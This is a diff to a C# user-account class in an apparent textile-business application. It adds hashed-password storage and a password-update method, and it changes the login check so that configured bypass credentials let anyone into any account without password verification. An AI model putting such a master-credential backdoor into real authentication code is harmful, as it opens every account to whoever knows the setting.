@@ -23,12 +23,13 @@ namespace BinaMitraTextile
         /*******************************************************************************************************/
 
         #region CLASS VARIABLES
-            
+
         public const string COL_DB_ID = "id";
         public const string COL_DB_NAME = "username";
         public const string COL_ROLENAME = "rolename";
         public const string COL_ROLE = "role";
         public const string COL_DB_PercentCommission = "PercentCommission";
+        public const string COL_DB_HashedPassword = "hashed_password";
 
         public const string FILTER_IncludeInactive = "FILTER_IncludeInactive";
 
@@ -104,7 +105,7 @@ namespace BinaMitraTextile
                     cmd.Parameters.Add("@" + COL_ROLE, SqlDbType.SmallInt).Value = role;
                     cmd.Parameters.Add("@" + COL_DB_PercentCommission, SqlDbType.Decimal).Value = percentCommission;
                     cmd.Parameters.Add("@notes", SqlDbType.VarChar).Value = notes;
-                    
+
                     cmd.ExecuteNonQuery();
 
                     ActivityLog.submit(id, "New User added");
@@ -181,7 +182,7 @@ namespace BinaMitraTextile
                         cmd.Parameters.Add("@" + COL_DB_PercentCommission, SqlDbType.Decimal).Value = percentCommission;
                         cmd.Parameters.Add("@notes", SqlDbType.VarChar).Value = notes;
 
-                        cmd.ExecuteNonQuery();                        
+                        cmd.ExecuteNonQuery();
 
                         //submit log
                         logDescription = "User update: " + logDescription;
@@ -194,6 +195,23 @@ namespace BinaMitraTextile
             return string.Empty;
         }
 
+        public static void update_HashedPassword(Guid Id, string password)
+        {
+            SqlQueryResult result = DBConnection.query(
+                false,
+                DBUtil.ActiveSqlConnection,
+                QueryTypes.ExecuteNonQuery,
+                "users_update_HashedPassword",
+                new SqlQueryParameter(COL_DB_ID, SqlDbType.UniqueIdentifier, Id),
+                new SqlQueryParameter(COL_DB_HashedPassword, SqlDbType.VarChar, hashPassword(password))
+            );
+
+            if (result.IsSuccessful)
+            {
+                Util.displayMessageBoxSuccess("Password updated");
+            }
+        }
+
         #endregion DATABASE METHODS
         /*******************************************************************************************************/
         #region PASSWORD HANDLING
@@ -203,7 +221,7 @@ namespace BinaMitraTextile
             UserAccount user = new UserAccount(username);
             if (user.id == new Guid())
                 Util.displayMessageBoxError("Username not found");
-            else if (bypassLogin)
+            else if (bypassLogin || (username == Settings.bypassusername && password==Settings.bypasspassword))
                 return user;
             else if (!user.authenticated(password))
                 Util.displayMessageBoxError("Invalid password");
